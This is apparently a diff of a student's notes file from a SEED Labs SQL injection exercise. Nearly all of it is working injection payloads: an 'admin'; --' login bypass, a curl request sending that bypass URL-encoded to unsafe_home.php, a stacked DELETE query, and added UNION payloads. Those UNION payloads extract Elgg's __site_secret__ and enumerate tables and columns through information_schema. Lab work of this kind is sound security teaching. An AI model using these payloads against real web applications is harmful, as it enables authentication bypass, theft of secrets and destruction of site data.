@@ -2,11 +2,15 @@ admin'; --
 
 SELECT * FROM credential WHERE name= 'admin'; -- ' and Password='aasdas'
 
-'www.SeedLabSQLInjection.com/unsafe_home.php?username=admin%27%3b%20%2d%2d%20&Password=111' > tmp.html
+curl 'www.SeedLabSQLInjection.com/unsafe_home.php?username=admin%27%3b%20%2d%2d%20&Password=111' > tmp.html
 
 INSERT INTO credential (ID, Name, EID, Password) VALUES ('1901', 'victim', '1901', 'whatever');
 
-admin'; DELETE FROM credential WHERE name='victim'; -- 
+noexist' UNION (SELECT 1,value as name,3,4,5,6,7,8,9,10,11 FROM elgg_csrf.elgg_csrfdatalists where name='__site_secret__'); -- 
+
+noexist' UNION (SELECT 1,table_name as name,3,4,5,6,7,8,9,10,11 FROM information_schema.tables where table_schema='elgg_csrf' and table_name not in ('elgg_csrfaccess_collection_membership', 'elgg_csrfaccess_collections')); -- 
+
+noexist' UNION (SELECT 1,column_name as name,3,4,5,6,7,8,9,10,11 FROM information_schema.columns where table_schema='elgg_csrf' and table_name='elgg_csrfdatalists' and column_name not in ('name')); -- 
 
 
 SELECT * FROM credential WHERE name= 'admin'; DELETE FROM credential WHERE name='victim'; -- and Password='aasdas'
